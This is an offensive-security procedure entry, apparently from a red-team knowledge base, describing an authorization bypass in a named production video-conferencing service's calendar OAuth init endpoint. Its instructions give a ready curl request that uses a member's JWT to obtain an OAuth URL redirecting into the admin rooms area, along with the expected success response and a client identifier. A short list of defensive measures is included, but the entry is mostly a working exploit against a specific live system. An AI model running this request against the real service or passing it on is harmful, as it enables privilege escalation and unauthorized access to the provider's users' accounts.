---
tags:
  - access-bypass
  - oauth-init
  - 8x8
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/initiate-calendar-auth-bypass]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:30:18.092Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1f3b80a2-50a0-427a-a262-5a809f3c4ee5
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Initiate-Calendar-Auth-Bypass-as-Member

## Summary

This procedure exploits the lack of role validation on the 8x8 calendar auth init endpoint, allowing a member user to initiate an OAuth flow that redirects to the admin rooms add page, bypassing access controls.

## Description

The endpoint /meet-external/spot-roomkeeper/v1/calendar/auth/init does not check user roles before generating an OAuth URL for Cronofy calendar integration. By crafting a successRedirectUrl to the admin rooms area and using a member JWT, attackers can trigger privileged integration. This targets the web platform using JWT auth and OAuth 2.0.

## Requirements

1. Member user's JWT token from an authenticated session
2. Access to admin.8x8.vc (same-origin)
3. Tool like curl for HTTP requests

## Defense

Defensive measures and detection strategies:

- Enforce role-based checks on all auth init endpoints
- Validate redirect URLs against allowlists to prevent admin path targeting
- Monitor for anomalous OAuth initiations from low-privilege accounts

## Objectives

1. Bypass role checks to obtain OAuth URL
2. Set up redirect to privileged admin area
3. Enable unauthorized calendar linking

## Instructions

### Step 1: Prepare the Request

**Context**: Craft the GET request with member JWT and admin redirect URL.

Use [[commands/initiate-calendar-auth-bypass]]:

```bash
curl -X GET "https://admin.8x8.vc/meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd" \
  -H "Authorization: Bearer <member-jwt-token>" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0" \
  -H "Accept: */*" \
  -H "Referer: https://admin.8x8.vc/"
```

> The command sends the request; expect a 200 OK with JSON containing the OAuth URL if bypass succeeds.

### Step 2: Validate Response

**Context**: Check for the OAuth URL without errors.

Parse the response for the 'url' field.

> Success: URL like https://app.cronofy.com/oauth/authorize?... with parameters including client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9 and redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

-

## Commands Used

- [[commands/initiate-calendar-auth-bypass]]

## Tools Used

-

## Tags

- [[access-bypass]]
- [[oauth-init]]
